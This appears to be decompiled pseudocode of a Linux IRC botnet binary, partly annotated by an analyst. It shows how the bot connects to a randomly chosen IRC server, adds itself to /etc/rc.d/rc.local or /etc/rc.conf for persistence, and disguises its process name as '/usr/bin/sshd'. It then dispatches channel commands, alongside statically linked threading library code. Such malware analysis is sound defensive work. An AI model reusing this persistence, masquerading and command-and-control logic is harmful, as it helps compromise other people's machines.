  int v5; // [esp+10h] [ebp-18h]@9
  unsigned int v6; // [esp+20h] [ebp-8h]@11
  int v7; // [esp+24h] [ebp-4h]@7
  int savedregs; // [esp+28h] [ebp+0h]@8

  while ( 1 )
  {
LABEL_1:
    sock = -1;
    v2 = 1;
    if ( !changeservers )
      server = (int)servers[rand() % numservers];
    changeservers = 0;
    do
      sock = socket(2, 1, 6);
    while ( sock < 0 );
    if ( inet_addr((char *)server) && inet_addr((char *)server) != -1 )
      break;
    v7 = gethostbyname((unsigned __int8 *)server);
    if ( v7 )
    {
      bcopy(**(char ***)(v7 + 16), (char *)&v5, *(_DWORD *)(v7 + 12));
      goto LABEL_11;
    }
    server = 0;
    close((off_t)&savedregs, sock);
  }
  v5 = inet_addr((char *)server);
LABEL_11:
  v3 = 2;
  v0 = atol(irc_port[0]);
  v4 = htons(v0);
  ioctl(sock, 21537);
  v6 = time(0);
  while ( 1 )
  {
    if ( time(0) - v6 > 9 )
    {
LABEL_19:
      server = 0;
      close((off_t)&savedregs, sock);
      goto LABEL_1;
    }
    *(_DWORD *)_errno_location() = 0;
    if ( !connect((off_t)&savedregs, sock, (int)&v3, 16) || *(_DWORD *)_errno_location() == 106 )
      break;
    if ( *(_DWORD *)_errno_location() != 115 && *(_DWORD *)_errno_location() != 114 )
      goto LABEL_19;
    sleep((off_t)&savedregs, 1);
  }
  setsockopt(sock, 1, 13, 0, 0);
  setsockopt(sock, 1, 2, 0, 0);
  return setsockopt(sock, 1, 9, 0, 0);
}
// 80533F0: using guessed type int rand(void);
// 805D3C0: using guessed type int numservers;
// 805D3CC: using guessed type char *irc_port[13];
// 8061C40: using guessed type int changeservers;
// 806A5E8: using guessed type int server;

//----- (0804AA68) --------------------------------------------------------
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  bool v3; // cf@4
  bool v4; // zf@4
  char **cwd_ptr; // esi@4
  int slash2; // edi@4
  signed int counter_2; // ecx@4
  int v8; // edi@22
  unsigned int v9; // kr08_4@22
  char *v10; // edi@23
  unsigned int v11; // kr0C_4@23
  unsigned int seconds; // ebx@25
  int pid; // ebx@25
  signed int ppid; // eax@25
  int v15; // [esp-14h] [ebp-1AC8h]@4
  int v16; // [esp-4h] [ebp-1AB8h]@4
  char *v17; // [esp+0h] [ebp-1AB4h]@51
  char *v18; // [esp+4h] [ebp-1AB0h]@45
  const char *v19; // [esp+8h] [ebp-1AACh]@23
  const char *v20; // [esp+Ch] [ebp-1AA8h]@22
  int v21; // [esp+10h] [ebp-1AA4h]@4
  const char *slash1; // [esp+14h] [ebp-1AA0h]@4
  char **ptr_to_cwd; // [esp+18h] [ebp-1A9Ch]@4
  const char *string1; // [esp+1Ch] [ebp-1A98h]@4
  int *v25; // [esp+20h] [ebp-1A94h]@1
  char buf4096[4096]; // [esp+28h] [ebp-1A8Ch]@40
  _WORD v27[512]; // [esp+1028h] [ebp-A8Ch]@47
  char v28; // [esp+1428h] [ebp-68Ch]@12
  fd_set readfds; // [esp+1828h] [ebp-28Ch]@11
  int v30; // [esp+18A8h] [ebp-20Ch]@27
  struct timeval timeout; // [esp+1928h] [ebp-18Ch]@27
  char rekt; // [esp+1932h] [ebp-182h]@25
  char *cwd; // [esp+1964h] [ebp-150h]@4
  int i; // [esp+1A64h] [ebp-50h]@22
  char *startup_str; // [esp+1A6Ch] [ebp-48h]@1
  unsigned int *rc_local_fd; // [esp+1A70h] [ebp-44h]@1
  char *ptr_to_rekt; // [esp+1A74h] [ebp-40h]@25
  char *v38; // [esp+1A78h] [ebp-3Ch]@25
  unsigned int str_len; // [esp+1A7Ch] [ebp-38h]@4
  int counter; // [esp+1A80h] [ebp-34h]@4
  int startup_str_fd2; // [esp+1A84h] [ebp-30h]@16
  unsigned int j; // [esp+1A88h] [ebp-2Ch]@28
  int v43; // [esp+1A8Ch] [ebp-28h]@27
  int *v44; // [esp+1A90h] [ebp-24h]@27
  int v45; // [esp+1A94h] [ebp-20h]@33
  unsigned int k; // [esp+1A98h] [ebp-1Ch]@30
  char *l; // [esp+1A9Ch] [ebp-18h]@41
  unsigned int m; // [esp+1AA0h] [ebp-14h]@40
  int *v49; // [esp+1AA4h] [ebp-10h]@1
  int savedregs; // [esp+1AB4h] [ebp+0h]@12

  v49 = &argc;
  v25 = &argc;
  startup_str = "/etc/rc.d/rc.local";
  rc_local_fd = (unsigned int *)fopen("/etc/rc.d/rc.local", (int)"r");
  if ( !rc_local_fd )
  {
    startup_str = "/etc/rc.conf";
    rc_local_fd = (unsigned int *)fopen("/etc/rc.conf", (int)"r");
  }
  if ( rc_local_fd )
  {
    string1 = *(const char **)v25[1];
    str_len = strlen(string1);
    counter = 0;
    getcwd((int)&cwd, 256u);
    v3 = __CFADD__(&v15, 16);
    v4 = &v16 == 0;
    ptr_to_cwd = &cwd;
    slash1 = "/";
    v21 = 2;
    cwd_ptr = &cwd;
    slash2 = (int)"/";
    counter_2 = 2;

    do
    {
      if ( !counter_2 )
        break;
      v3 = *(_BYTE *)cwd_ptr < *(_BYTE *)slash2;
      v4 = *(_BYTE *)cwd_ptr == *(_BYTE *)slash2;
      cwd_ptr = (char **)((char *)cwd_ptr + 1);
      ++slash2;
      --counter_2;
    }
    while ( v4 );

    if ( (!v3 && !v4) == v3 )
    {
      fclose((int)rc_local_fd);
    }
    else
    {
      while ( *(_BYTE *)(*(_DWORD *)v25[1] + str_len) != 47 )
        --str_len;
      sprintf((int)&readfds, "\"%s%s\"\n", &cwd, *(_DWORD *)v25[1] + str_len);
      while ( !feof((off_t)&savedregs, (int *)rc_local_fd) )
      {
        fgets((off_t)&savedregs, &v28, 1024, rc_local_fd);
        if ( !strcasecmp((unsigned __int8 *)&v28, (unsigned __int8 *)&readfds) )
          ++counter;
      }
      if ( counter )
      {
        fclose((int)rc_local_fd);
      }
      else
      {
        fclose((int)rc_local_fd);
        startup_str_fd2 = fopen(startup_str, (int)"a");
        if ( startup_str_fd2 )
        {

          // write into the startup_file
          fputs((off_t)&savedregs, (char *)&readfds, startup_str_fd2);
          fclose(startup_str_fd2);
        }
      }
    }
  }

  // fork off a child process
  if ( fork() )
    exit((off_t)&savedregs, 0);
  v20 = *(const char **)v25[1];
  v9 = strlen(v20) + 1;
  v8 = (int)&v20[v9];
  strncpy(*(_BYTE **)v25[1], "/usr/bin/sshd", v9 - 1);
  for ( i = 1; i < *v25; ++i )
  {
    v19 = *(const char **)(v25[1] + 4 * i);
    v11 = strlen(v19) + 1;
    v10 = *(char **)(v25[1] + 4 * i);
    memset(v10, 0, v11 - 1);
    v8 = (int)&v10[v11 - 1];
  }

  // seed the random number generator
  seconds = time(0);
  pid = getpid() ^ seconds;
  ppid = getppid();
  srandom((off_t)&savedregs, pid + ppid);

  ptr_to_rekt = bot_prefix[0];
  v38 = makestring(v8);
  strcpy(&rekt, ptr_to_rekt);
  strcat(&rekt, v38);
  nick = (int)&rekt;
  ident = (int)"Remote";
  user = (int)"Remote IRC Bot";
  chan = (int)irc_chan[0];
  key = (int)&global_key_pass;
  pass = (int)&global_key_pass;
  server = 0;
  while ( 1 )
  {
LABEL_26:
    con();
    Send(sock, "PASS %s\n", pass);
    Send(sock, "NICK %s\nUSER %s localhost localhost :%s\n", nick, ident, user);
    while ( 1 )
    {
      memset(&readfds, 0, sizeof(readfds));
      v43 = 0;
      v44 = &v30;
      _bittestandset((signed __int32 *)&readfds + ((unsigned int)sock >> 5), sock & 0x1F);
      timeout.tv_sec = 1200;
      timeout.tv_usec = 0;
      if ( (signed int)select(sock + 1, &readfds, 0, 0, &timeout) <= 0 )
        break;
      for ( j = 0; j < numpids; ++j )
      {
        if ( (signed int)waitpid((off_t)&savedregs, *(_DWORD *)(4 * j + pids), 0, 1) > 0 )
        {
          for ( k = j + 1; k < numpids; ++k )
            *(_DWORD *)(4 * k + pids - 4) = *(_DWORD *)(4 * k + pids);
          *(_DWORD *)(4 * k + pids - 4) = 0;
          v45 = malloc((off_t)&savedregs, (int)&v30, 4 * --numpids + 4);
          for ( k = 0; k < numpids; ++k )
            *(_DWORD *)(v45 + 4 * k) = *(_DWORD *)(4 * k + pids);
          free((unsigned int)&savedregs, (_DWORD *)pids);
          pids = v45;
        }
      }
      if ( _bittest((const signed __int32 *)&readfds + ((unsigned int)sock >> 5), sock & 0x1F) )
      {
        m = recv((off_t)&savedregs, sock, (int)buf4096, 4096, 0);
        if ( (signed int)m <= 0 )
          goto LABEL_26;
        buf4096[m] = 0;
        for ( l = strtok(buf4096, "\n"); l && *l; l = strtok(0, "\n") )
        {
          filter(l);
          if ( *l == 58 )
          {
            for ( m = 0; ; ++m )
            {
              v18 = l;
              if ( m >= strlen(l) || l[m] == 32 )
                break;
            }
            l[m] = 0;
            strcpy((_BYTE *)v27, l + 1);
            strcpy(l, &l[m + 1]);
          }
          else
          {
            v27[0] = 42;
          }
          for ( m = 0; ; ++m )
          {
            v17 = l;
            if ( m >= strlen(l) || l[m] == 32 )
              break;
          }
          l[m] = 0;
          strcpy(&v28, l);
          strcpy(l, &l[m + 1]);
          for ( m = 0; (&msgs)[2 * m]; ++m )
          {
            if ( !strcasecmp((unsigned __int8 *)(&msgs)[2 * m], (unsigned __int8 *)&v28) )
              (*(&off_805D484 + 2 * m))(sock, (int)v27, (int)l);
          }
          if ( !strcasecmp((unsigned __int8 *)&v28, "ERROR") )
            goto LABEL_26;
        }
      }
    }
  }
}
// 805D3D0: using guessed type char *irc_chan[12];
// 805D3D8: using guessed type char *bot_prefix[10];
// 805D480: using guessed type char *msgs;
// 805D484: using guessed type int (__cdecl *off_805D484)(int, int, int);
// 8061C50: using guessed type int numpids;
// 806A5D4: using guessed type int ident;
// 806A5D8: using guessed type int pass;
// 806A5DC: using guessed type int nick;
// 806A5E4: using guessed type int user;
// 806A5E8: using guessed type int server;
// 806A5F4: using guessed type int key;
// 806A5F8: using guessed type int chan;
// 806A5FC: using guessed type int pids;
// 804AA68: using guessed type char buf4096[4096];

//----- (0804B1D4) --------------------------------------------------------
void **thread_self()
{
  void **result; // eax@1
  void *retaddr; // [esp+0h] [ebp+0h]@1

  result = &_pthread_initial_thread;
  if ( (unsigned int)&retaddr < _pthread_initial_thread_bos )
  {
    if ( (unsigned int)&retaddr < _pthread_manager_thread_bos
      || (result = (void **)&_pthread_manager_thread, (unsigned int)&retaddr >= _pthread_manager_thread_tos) )
    {
      if ( _pthread_nonstandard_stacks )
        result = (void **)_pthread_find_self();
      else
        result = (void **)(((unsigned int)&retaddr | 0x1FFFFF) - 479);
    }
  }
  return result;
}
// 80614E0: using guessed type void *_pthread_initial_thread;
// 80661CC: using guessed type int _pthread_initial_thread_bos;
// 80661D0: using guessed type int _pthread_manager_thread_bos;
// 806A600: using guessed type int _pthread_nonstandard_stacks;

//----- (0804B213) --------------------------------------------------------
void *_h_errno_location()
{
  return thread_self()[19];
}

//----- (0804B222) --------------------------------------------------------
void *_errno_location()
{
  return thread_self()[17];
}

//----- (0804B234) --------------------------------------------------------
void __cdecl _pthread_manager_adjust_prio(signed int a1)
{
  struct sched_param p; // [esp+14h] [ebp-8h]@2

  if ( a1 > dword_80616D8 )
  {
    p.__sched_priority = a1 + (a1 < (signed int)sched_get_priority_max(1));
    sched_setscheduler(pid, 1, &p);
    dword_80616D8 = a1;
  }
}
// 80616D8: using guessed type int dword_80616D8;

//----- (0804B280) --------------------------------------------------------
_DWORD *_pthread_manager_sighandler()
{
  _BOOL4 v0; // edx@1
  _DWORD *result; // eax@1
  int addr; // [esp+18h] [ebp-94h]@4
  int v3; // [esp+1Ch] [ebp-90h]@4

  v0 = 0;
  result = (_DWORD *)terminated_children;
  if ( !terminated_children )
    v0 = main_thread_exiting != 0;
  terminated_children = 1;
  if ( v0 )
  {
    addr = 0;
    v3 = 6;
    do
    {
      result = (_DWORD *)(_libc_write(_pthread_manager_request, &addr, 0x94u) + 1);
      if ( result )
        break;
      result = _errno_location();
    }
    while ( *result == 4 );
  }
  return result;
}
// 8066080: using guessed type int terminated_children;
// 8066084: using guessed type int main_thread_exiting;

//----- (0804B2E8) --------------------------------------------------------
void **__usercall pthread_kill_all_threads@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v2; // esi@1
  void **result; // eax@1
  int v4; // edi@1
  void **i; // ebx@1

  v2 = a1;
  result = _pthread_main_thread;
  v4 = a2;
  for ( i = (void **)*_pthread_main_thread; i != _pthread_main_thread; i = (void **)*i )
    result = (void **)kill((int)i[5], v2);
  if ( v4 )
    result = (void **)kill((int)i[5], v2);
  return result;
}
// 80618A0: using guessed type void **_pthread_main_thread;

//----- (0804B326) --------------------------------------------------------
void __usercall __noreturn pthread_start_thread(off_t a1@<ebp>, int a2)
{
  int v2; // edx@1
  void *v3; // eax@11
  int addr; // [esp+10h] [ebp-9Ch]@7
  int v5; // [esp+14h] [ebp-98h]@7
  struct sched_param p; // [esp+A4h] [ebp-8h]@4
  char v7; // [esp+A8h] [ebp-4h]@11

  *(_DWORD *)(a2 + 20) = getpid();
  sigprocmask(2u, a2 + 100);
  v2 = *(_DWORD *)(a2 + 228);
  if ( v2 < 0 )
  {
    if ( dword_80616D8 > 0 )
    {
      p.__sched_priority = 0;
      sched_setscheduler(*(_DWORD *)(a2 + 20), 0, &p);
    }
  }
  else
  {
    sched_setscheduler(*(_DWORD *)(a2 + 20), v2, (const struct sched_param *)(a2 + 232));
  }
  if ( _pthread_threads_debug && _pthread_sig_debug > 0 )
  {
    addr = a2;
    v5 = 5;
    while ( _libc_write(_pthread_manager_request, &addr, 0x94u) == -1 && *(_DWORD *)_errno_location() == 4 )
      ;
    _pthread_wait_for_restart_signal(a2);
  }
  v3 = (void *)(*(int (__cdecl **)(_DWORD))(a2 + 92))(*(_DWORD *)(a2 + 96));
  _pthread_do_exit(a1, v3, (unsigned int)&v7);
}
// 80616D8: using guessed type int dword_80616D8;
// 806A610: using guessed type int _pthread_threads_debug;

//----- (0804B3F5) --------------------------------------------------------
void __usercall __noreturn pthread_start_thread_event(off_t a1@<ebp>, int a2)
{
  *(_DWORD *)(a2 + 20) = getpid();
  _pthread_lock(*(volatile signed __int32 **)(a2 + 28), 0);
  _pthread_unlock(*(volatile signed __int32 **)(a2 + 28));
  pthread_start_thread(a1, a2);
}

//----- (0804B422) --------------------------------------------------------
int __usercall pthread_free@<eax>(int a1@<eax>, unsigned int a2@<ebp>)
{
  int v2; // esi@1
  int v3; // ebx@1
  _DWORD *i; // eax@1
  _DWORD *v5; // ebx@2
  _DWORD *j; // eax@4
  _DWORD *v7; // ebx@5
  int v8; // eax@9
  int v10; // [esp+0h] [ebp-Ch]@0

  v2 = a1;
  v3 = 16 * (*(_DWORD *)(a1 + 16) & 0x3FF) + 134599872;
  _pthread_lock((volatile signed __int32 *)v3, 0);
  *(_DWORD *)(v3 + 8) = 0;
  *(_DWORD *)(v3 + 12) = -1;
  _pthread_unlock((volatile signed __int32 *)v3);
  --_pthread_handles_num;
  for ( i = *(_DWORD **)(v2 + 448); i; i = v5 )
  {
    v5 = (_DWORD *)*i;
    free(a2, i);
  }
  for ( j = *(_DWORD **)(v2 + 452); j; j = v7 )
  {
    v7 = (_DWORD *)*j;
    free(a2, j);
  }
  if ( (void **)v2 != &_pthread_initial_thread && !*(_DWORD *)(v2 + 392) )
  {
    v8 = *(_DWORD *)(v2 + 400);
    if ( v8 )
      munmap(*(_DWORD *)(v2 + 396), v8);
    munmap(v2 - 2096672, 0x200000);
  }
  return v10;
}
// 80614C0: using guessed type int _pthread_handles_num;
// 80614E0: using guessed type void *_pthread_initial_thread;

//----- (0804B4E4) --------------------------------------------------------
unsigned int __usercall restart@<eax>(int a1@<eax>)
{
  return _pthread_restart_new(a1);
}

//----- (0804B4F1) --------------------------------------------------------
signed int __usercall pthread_reap_children@<eax>(unsigned int a1@<ebp>)
{
  void **i; // esi@2
  void **v2; // edx@3
  int v3; // eax@5
  int v4; // ebx@7
  signed int result; // eax@17
  int status; // [esp+10h] [ebp-Ch]@14

  while ( 1 )
  {
    result = _libc_waitpid(-1, &status, -2147483647);
    if ( result <= 0 )
      return result;
    for ( i = (void **)*_pthread_main_thread; i != _pthread_main_thread; i = (void **)*i )
    {
      v2 = (void **)*i;
      if ( i[5] == (void *)result )
      {
        v2[1] = i[1];
        *(_DWORD *)i[1] = v2;
        _pthread_lock((volatile signed __int32 *)i[7], 0);
        *((_BYTE *)i + 46) = 1;
        if ( i[103] )
        {
          v3 = (unsigned int)i[104] | _pthread_threads_events;
          if ( BYTE1(v3) & 8 )
          {
            i[106] = (void *)12;
            i[107] = i;
            _pthread_last_event = (int)i;
            _linuxthreads_reap_event();
          }
        }
        v4 = *((char *)i + 45);
        _pthread_unlock((volatile signed __int32 *)i[7]);
        if ( v4 )
          pthread_free((int)i, a1);
        break;
      }
    }
    if ( main_thread_exiting && *_pthread_main_thread == _pthread_main_thread )
      restart((int)*_pthread_main_thread);
    if ( (char)((char)((status & 0x7F) + 1) >> 1) > 0 )
    {
      pthread_kill_all_threads(status & 0x7F, 1);
      exit(0);
    }
  }
}
// 804E63E: using guessed type int _linuxthreads_reap_event(void);
// 80618A0: using guessed type void **_pthread_main_thread;
// 8066084: using guessed type int main_thread_exiting;
// 806A604: using guessed type int _pthread_threads_events;
// 806A60C: using guessed type int _pthread_last_event;

//----- (0804B5E5) --------------------------------------------------------
void __cdecl _pthread_manager(int fd)
{
  unsigned int v1; // ebp@1
  int v2; // ST10_4@4
  int v3; // edi@4
  unsigned int v4; // ebx@8
  int v5; // eax@8
  signed int v6; // eax@17
  signed int v7; // edx@17
  _DWORD *v8; // esi@23
  unsigned int v9; // ebx@25
  size_t v10; // ecx@27
  int v11; // ebx@32
  int v12; // edx@32
  int v13; // eax@33
  int v14; // eax@40
  int v15; // eax@40
  int v16; // esi@40
  int v17; // eax@43
  int v18; // eax@45
  int v19; // eax@47
  int v20; // eax@50
  int v21; // eax@53
  int *v22; // esi@54
  int v23; // ebx@54
  int v24; // ebx@60
  _DWORD *i; // esi@60
  _DWORD *j; // ebx@63
  unsigned int v27; // [esp+0h] [ebp-168h]@0
  int *v28; // [esp+Ch] [ebp-15Ch]@0
  struct user_desc *newtls; // [esp+10h] [ebp-158h]@15
  int *child_pidptr; // [esp+14h] [ebp-154h]@29
  int v31; // [esp+18h] [ebp-150h]@29
  int v32; // [esp+1Ch] [ebp-14Ch]@32
  unsigned int v33; // [esp+20h] [ebp-148h]@18
  int v34; // [esp+24h] [ebp-144h]@15
  pid_t pid; // [esp+28h] [ebp-140h]@15
  int v36; // [esp+2Ch] [ebp-13Ch]@15
  int v37; // [esp+30h] [ebp-138h]@15
  unsigned int v38; // [esp+34h] [ebp-134h]@24
  int addr; // [esp+3Ch] [ebp-12Ch]@5
  int v40; // [esp+40h] [ebp-128h]@14
  int v41; // [esp+44h] [ebp-124h]@15
  int v42; // [esp+48h] [ebp-120h]@15
  int v43; // [esp+4Ch] [ebp-11Ch]@15
  char v44; // [esp+50h] [ebp-118h]@38
  char v45; // [esp+D0h] [ebp-98h]@1
  int v46; // [esp+150h] [ebp-18h]@7
  __int16 v47; // [esp+154h] [ebp-14h]@7
  char v48; // [esp+156h] [ebp-12h]@13

  off_8061704 = &unk_8061708;
  dword_806170C = (int)&unk_8061710;
  sigfillset(&v45);
  v1 = v27;
  sigdelset((int)&v45, _pthread_sig_cancel);
  sigdelset((int)&v45, 5);
  if ( _pthread_threads_debug && _pthread_sig_debug > 0 )
    sigdelset((int)&v45, _pthread_sig_debug);
  sigprocmask(2u, (int)&v45);
  v3 = v2;
  _pthread_manager_adjust_prio((signed int)_pthread_main_thread[6]);
  while ( _libc_read(fd, &addr, 0x94u) == -1 && *(_DWORD *)_errno_location() == 4 )
    ;
  v47 = 1;
  v46 = fd;
  while ( 1 )
  {
    do
    {
LABEL_8:
      v4 = poll((struct pollfds *)&v46, 1u, 2000);
      v5 = getppid();
      if ( v5 == 1 )
      {
        LOBYTE(v5) = 9;
        pthread_kill_all_threads(v5, 0);
LABEL_67:
        exit(0);
      }
      if ( terminated_children )
      {
        terminated_children = 0;
        pthread_reap_children(v1);
      }
    }
    while ( v4 != 1 || !(v48 & 1) );
    _libc_read(fd, &addr, 0x94u);
    switch ( v40 )
    {
      case 0:
        v3 = v41;
        newtls = (struct user_desc *)addr;
        v34 = *(_DWORD *)(addr + 412);
        pid = *(_DWORD *)(addr + 20);
        v36 = v43;
        v37 = v42;
        v1 = getpagesize();
        if ( v3 )
        {
          if ( *(_DWORD *)(v3 + 4) )
          {
            v6 = geteuid();
            v7 = 1;
            if ( v6 )
              goto LABEL_53;
          }
        }
        v33 = 2;
        break;
      case 1:
        v3 = v41;
        v22 = &_pthread_handles[4 * (v41 & 0x3FF)];
        _pthread_lock((volatile signed __int32 *)v22, 0);
        v23 = v22[2];
        if ( !v23 || *(_DWORD *)(v23 + 16) != v3 )
          goto LABEL_59;
        if ( *(_BYTE *)(v23 + 46) )
        {
          _pthread_unlock((volatile signed __int32 *)v22);
          pthread_free(v23, v1);
        }
        else
        {
          *(_BYTE *)(v23 + 45) = 1;
LABEL_59:
          _pthread_unlock((volatile signed __int32 *)v22);
        }
        goto LABEL_8;
      case 2:
        v24 = addr;
        _pthread_exit_requested = 1;
        _pthread_exit_code = v41;
        for ( i = *(_DWORD **)addr; i != (_DWORD *)v24; i = (_DWORD *)*i )
          kill(i[5], _pthread_sig_cancel);
        for ( j = (_DWORD *)*i; j != i; j = (_DWORD *)*j )
          waitpid(v1, j[5], 0, 2147483648);
        restart((int)j);
        goto LABEL_67;
      case 3:
        main_thread_exiting = 1;
        pthread_reap_children(v1);
        if ( *_pthread_main_thread != _pthread_main_thread )
          goto LABEL_8;
        v21 = (int)*_pthread_main_thread;
        goto LABEL_70;
      case 4:
        sem_post(v1, v3, v41);
        goto LABEL_8;
      case 5:
        if ( _pthread_threads_debug && _pthread_sig_debug > 0 )
          raise(_pthread_sig_debug);
        goto LABEL_8;
      default:
        goto LABEL_8;
    }
    while ( 1 )
    {
      if ( v33 > 0x3FF )
      {
        v7 = 11;
        goto LABEL_53;
      }
      if ( !(&off_805D4C8)[4 * v33] )
      {
        if ( v3 && *(_DWORD *)(v3 + 24) )
        {
          v1 = *(_DWORD *)(v3 + 28) - *(_DWORD *)(v3 + 32);
          v8 = (_DWORD *)((*(_DWORD *)(v3 + 28) & 0xFFFFFFFC) - 480);
          _pthread_nonstandard_stacks = 1;
          goto LABEL_30;
        }
        v38 = 0x200000 - v1;
        if ( !v3 || (v9 = v1 * ((*(_DWORD *)(v3 + 32) + v1 - 1) / v1), v38 < v9) )
          v9 = 0x200000 - v1;
        v8 = (_DWORD *)(_pthread_initial_thread_bos - (v33 << 21) + 2096672);
        if ( mmap((size_t)&v8[-_pagesize], v9, v1, v3, (int)v8, _pthread_initial_thread_bos + 32 - 4 * _pagesize - 32) != -1 )
          break;
      }
      ++v33;
    }
    v1 = (unsigned int)v8 + -v9 + 480;
    if ( v9 == v38
      || (child_pidptr = *(int **)(v3 + 20),
          v31 = v1 - (_DWORD)child_pidptr,
          mmap(v10, v9, (off_t)v8 + -v9 + 480, v3, (int)v8, (_BYTE)v8 - v9 - 32 - (_BYTE)child_pidptr) == -1) )
    {
LABEL_30:
      v31 = 0;
      child_pidptr = 0;
    }
    memset(v8, 0, 0x1E0u);
    ++_pthread_handles_num;
    v11 = (int)v8;
    pthread_threads_counter += 1024;
    v32 = v33 + pthread_threads_counter;
    v8[4] = v33 + pthread_threads_counter;
    v12 = 4 * v33;
    v8[17] = v8 + 18;
    *((_BYTE *)v8 + 64) = 0;
    *((_BYTE *)v8 + 65) = 0;
    v8[7] = &_pthread_handles[4 * v33];
    v8[19] = v8 + 20;
    v8[99] = v31;
    v8[101] = v8;
    v8[100] = child_pidptr;
    v8[102] = v33;
    _pthread_handles[v12 + 1] = 0;
    _pthread_handles[v12] = 0;
    (&off_805D4C8)[v12] = (void **)v8;
    dword_805D4CC[v12] = v1;
    v8[57] = -1;
    if ( v3 )
    {
      *((_BYTE *)v8 + 45) = *(_DWORD *)v3;
      v8[98] = *(_DWORD *)(v3 + 24);
      v13 = *(_DWORD *)(v3 + 12);
      if ( v13 )
      {
        if ( v13 == 1 )
        {
          v8[57] = *(_DWORD *)(v3 + 4);
          memcpy((char *)v8 + 232, (char *)(v3 + 8), 4u);
        }
      }
      else
      {
        v8[57] = sched_getscheduler(pid);
        sched_getparam(pid, (struct sched_param *)v8 + 58);
      }
      v8[6] = v8[58];
    }
    v8[23] = v37;
    v8[24] = v36;
    memcpy((char *)v8 + 100, &v44, 0x80u);
    _pthread_manager_adjust_prio(v8[6]);
    v8[1] = _pthread_main_thread;
    *v8 = *_pthread_main_thread;
    *((_DWORD *)*_pthread_main_thread + 1) = v8;
    *_pthread_main_thread = v8;
    if ( !v34 || (char)(_pthread_threads_events | *((_BYTE *)newtls + 416)) >= 0 )
      goto LABEL_78;
    _pthread_lock((volatile signed __int32 *)v8[7], 0);
    v14 = _pthread_sig_cancel;
    BYTE1(v14) |= 0xFu;
    v15 = clone((int)pthread_start_thread_event, (int)v8, v14, (int)v8, v28, newtls, child_pidptr);
    v16 = v15;
    if ( v15 != -1 )
    {
      *(_DWORD *)(v11 + 428) = v11;
      *(_DWORD *)(v11 + 424) = 8;
      _pthread_last_event = v11;
      *(_DWORD *)(v11 + 20) = v15;
      _linuxthreads_create_event();
      _pthread_unlock(*(volatile signed __int32 **)(v11 + 28));
    }
    if ( !v16 )
    {
LABEL_78:
      v17 = _pthread_sig_cancel;
      BYTE1(v17) |= 0xFu;
      v16 = clone((int)pthread_start_thread, v11, v17, v11, v28, newtls, child_pidptr);
    }
    if ( v16 == -1 )
    {
      v18 = *(_DWORD *)v11;
      *(_DWORD *)(v18 + 4) = *(_DWORD *)(v11 + 4);
      **(_DWORD **)(v11 + 4) = v18;
      if ( !v3 || !*(_DWORD *)(v3 + 24) )
      {
        v19 = *(_DWORD *)(v11 + 400);
        if ( v19 )
          munmap(*(_DWORD *)(v11 + 396), v19);
        munmap(v11 - 4 * _pagesize + 480, 4 * _pagesize);
      }
      v20 = 4 * v33;
      (&off_805D4C8)[v20] = 0;
      dword_805D4CC[v20] = 0;
      --_pthread_handles_num;
      v7 = *(_DWORD *)_errno_location();
    }
    else
    {
      *(_DWORD *)(v11 + 20) = v16;
      *((_DWORD *)newtls + 12) = v32;
      v7 = 0;
    }
LABEL_53:
    *((_DWORD *)newtls + 13) = v7;
    v21 = addr;
LABEL_70:
    restart(v21);
  }
}
// 804E63C: using guessed type int _linuxthreads_create_event(void);
// 805D4C0: using guessed type int _pthread_handles[];
// 805D4C8: using guessed type void **off_805D4C8;
// 805D4CC: using guessed type int dword_805D4CC[];
// 80614C0: using guessed type int _pthread_handles_num;
// 8061704: using guessed type void *off_8061704;
// 806170C: using guessed type int dword_806170C;
// 80618A0: using guessed type void **_pthread_main_thread;
// 8066080: using guessed type int terminated_children;
// 8066084: using guessed type int main_thread_exiting;
// 8066088: using guessed type int pthread_threads_counter;
// 80661CC: using guessed type int _pthread_initial_thread_bos;
// 80661D8: using guessed type int _pthread_exit_requested;
// 806A474: using guessed type int _pagesize;
// 806A600: using guessed type int _pthread_nonstandard_stacks;
// 806A604: using guessed type int _pthread_threads_events;
// 806A60C: using guessed type int _pthread_last_event;
// 806A610: using guessed type int _pthread_threads_debug;

//----- (0804BC46) --------------------------------------------------------
_DWORD *__cdecl _pthread_manager_event(int fd)
{
  _DWORD *v1; // eax@1
  int v2; // edx@1
  _DWORD *v3; // ecx@1

  _pthread_lock((volatile signed __int32 *)off_80616DC, 0);
  _pthread_unlock((volatile signed __int32 *)off_80616DC);
  _pthread_manager(fd);
  return pthread_insert_list(v1, v2, v3, fd);
}
// 80616DC: using guessed type void *off_80616DC;

//----- (0804BC70) --------------------------------------------------------
_DWORD *__usercall pthread_insert_list@<eax>(_DWORD *result@<eax>, int a2@<edx>, _DWORD *a3@<ecx>, int a4)
{
  _DWORD *v4; // ebx@1

  v4 = result;
  if ( a2 )
  {
    if ( a4 )
    {
      while ( *v4 )
        v4 = (_DWORD *)(*v4 + 4);
    }
    *a3 = a2;
    result = (_DWORD *)*v4;
    a3[1] = *v4;
    *v4 = a3;
  }
  return result;
}

//----- (0804BC94) --------------------------------------------------------
__int64 __usercall pthread_call_handlers@<edx:eax>(int a1@<eax>)
{
  int i; // ebx@1
  __int64 v3; // [esp+0h] [ebp-Ch]@0

  for ( i = a1; i; i = *(_DWORD *)(i + 4) )
    (*(void (**)(void))i)();
  return v3;
}

//----- (0804BCA9) --------------------------------------------------------
signed int fork()
{
  int v0; // ebp@1
  int v1; // ebx@1
  signed int v2; // edi@1
  unsigned int v4[5]; // [esp+28h] [ebp-14h]@3

  pthread_mutex_lock((int)&pthread_atfork_lock);
  v0 = pthread_atfork_child;
  v1 = pthread_atfork_parent;
  pthread_call_handlers(pthread_atfork_prepare);
  _pthread_once_fork_prepare();
  pthread_mutex_lock((int)&_malloc_lock);
  v2 = _libc_fork();
  if ( v2 )
  {
    pthread_mutex_unlock((int)&_malloc_lock);
    pthread_mutex_unlock((int)&pthread_atfork_lock);
    _pthread_once_fork_parent();
    pthread_call_handlers(v1);
  }
  else
  {
    if ( pthread_mutex_init )
    {
      pthread_mutexattr_init(v4);
      pthread_mutexattr_settype(v4, 1u);
      pthread_mutex_init(&_malloc_lock, (signed int *)v4);
      pthread_mutexattr_destroy();
      if ( pthread_mutex_init )
      {
        pthread_mutexattr_init(v4);
        pthread_mutexattr_settype(v4, 0);
        pthread_mutex_init(&pthread_atfork_lock, (signed int *)v4);
        pthread_mutexattr_destroy();
      }
    }
    _pthread_reset_main_thread(v0);
    _fresetlockfiles();
    _pthread_once_fork_child();
    pthread_call_handlers(v0);
  }
  return v2;
}
